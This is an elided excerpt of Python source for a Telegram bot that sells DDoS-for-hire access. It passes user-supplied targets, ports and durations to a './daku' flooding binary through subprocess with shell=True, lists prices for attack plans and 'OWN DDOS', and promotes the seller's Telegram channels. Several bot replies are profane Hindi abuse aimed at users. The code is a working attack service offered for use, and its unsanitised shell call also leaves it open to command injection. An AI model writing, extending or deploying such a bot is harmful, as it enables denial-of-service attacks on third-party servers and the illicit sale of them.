...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "मादरचोद 𝐁𝐎𝐓 तुम्हारे बाप का है क्या..??😂 @TRUSTVIP_MOD0    ."
...
f"🌪️ **𝗧𝗮𝗿𝗴𝗲𝘁 𝗸𝗼 𝗰𝗵𝗵𝗼𝗱𝗻𝗮 𝗺𝗮𝘁, 𝗝𝗮𝗹𝗱𝗶 𝗸𝗮𝗿 𝗻𝗶𝗽𝘁𝗮!** 🌪️"
    ...
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/+3c0NNd9oWNwyMjI1")
    )
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 180:
                ...
                full_command = f"./daku {target} {port} {time} {9} {900}"
                subprocess.run(full_command, shell=True)
                response = f"🔺TEL NIKAL DIYA HU🔻 \n\n🤐𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n🥵𝗣𝗼𝗿𝘁: {port} \n🥶𝗧𝗶𝗺𝗲: {time}"
        else:
...
def show_plan(message):
   ...
   # response += "- Pro Plan: $20/month\n"
    response += "- 3 DAYS 👉 250rs\n"
    response += "- 7 DAYS 👉 400rs\n"
    response += "- 1 MONTH👉 700rs\n"
    response += "- FULL SESON 👉 900rs\n"
    
    response += "- OWN DDOS ☠️ 1.3Krs\n"
    
    response = "- 𝐃𝐌 𝐌𝐄 -- @TRUSTVIP_MOD0\n"
...
def show_command_logs(message):
    ...
    if user_id in allowed_user_ids and is_subscribed(user_id):
        ...
        response = "🚧 अरे चोमू  phle खरीद लो लौडे 🤣 :- @TRUSTVIP_MOD0"
    bot.reply_to(message, response)
...
def show_admin_commands(message):
    ...
    if user_id in admin_id:
        ...
        response = "भुसडीयाके मादरचोद अपनी मॉ मत चुदा 𝘽𝙪𝙮 :- @TRUSTVIP_MOD0."
        bot.reply_to(message, response)
...
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/TRUSTFEDDBACK/1543"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['trust'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 --> 𝐒𝟒 \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @TRUSTVIP_MOD0 \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 TRUSTMOD
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/+3c0NNd9oWNwyMjI1'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/+3c0NNd9oWNwyMjI1')
    )
...
def welcome_start(message):
    ...
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('JOIN OWN CHNEL', url='https://t.me/+3c0NNd9oWNwyMjI1')  
    )
